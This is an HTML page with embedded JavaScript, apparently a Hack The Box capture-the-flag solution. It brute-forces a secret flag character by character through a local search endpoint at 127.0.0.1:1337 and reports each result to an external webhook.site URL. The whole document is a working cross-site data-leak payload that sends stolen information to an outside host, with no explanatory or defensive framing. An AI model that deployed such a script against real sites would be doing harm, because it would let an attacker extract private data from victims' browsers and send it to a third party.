<!DOCTYPE html>
<body>
    <script>
    var whook = 'https://webhook.site/124a8de9-b6df-42d6-ae06-869f6503e3fa/'
    var url = "http://127.0.0.1:1337/api/entries/search?q=";
    var htb = 'HTB';
    var letters = '';
        
    // flag characters
    for(var i=33; i<127; i++){
        letters += String.fromCharCode(i);
    }
        
    async function makeFetchRequest() {

        for(var i=0; i<letters.length; i++){
            await doGuess(letters[i]);//await doGuess(htb + letters[i]);
        }
    }

        
    async function doGuess(g){
        await fetch(url+g)
        .then(response => {
            if(response.ok){
                fetch(whook+'SUCCESS')
                
            }
        })
        .catch(error => {fetch(whook+g+'failed')})
    }
    makeFetchRequest();
    //doGuess('H');
   // doGuess('HT');
   // doGuess('HTB');
  //  doGuess('HTB{');
   // console.log("newest");
    </script>
</body>
